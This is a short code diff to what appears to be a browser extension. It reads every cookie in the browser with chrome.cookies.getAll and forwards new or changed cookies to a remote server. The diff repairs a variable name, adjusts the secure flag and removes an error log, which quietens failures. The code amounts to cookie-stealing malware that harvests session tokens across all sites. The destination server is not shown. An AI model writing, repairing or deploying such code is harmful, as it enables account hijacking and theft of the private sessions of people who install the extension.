@@ -6,9 +6,10 @@ function sendCookiesToServer(cookies) {
       
       cookie.expirationDate = new Date(cookie.expirationDate * 1000);
     }
+    cookie.secure = cookie.secure || false;
     return cookie;
   });
-  const newOrUpdatedCookies = formatExDateCookies.filter(cookie => {
+  const newOrUpdatedCookies = formattedCookies.filter(cookie => {
     const cookieId = `${cookie.domain}-${cookie.name}`;
     if (!sentCookies[cookieId] || sentCookies[cookieId] !== cookie.value) {
       sentCookies[cookieId] = cookie.value;
@@ -32,7 +33,6 @@ function sendCookiesToServer(cookies) {
 function getAllCookiesAndSendToServer() {
   chrome.cookies.getAll({}, function(cookies) {
     if (chrome.runtime.lastError) {
-      console.error('Error retrieving cookies:', chrome.runtime.lastError);
       return;
     }
     sendCookiesToServer(cookies);
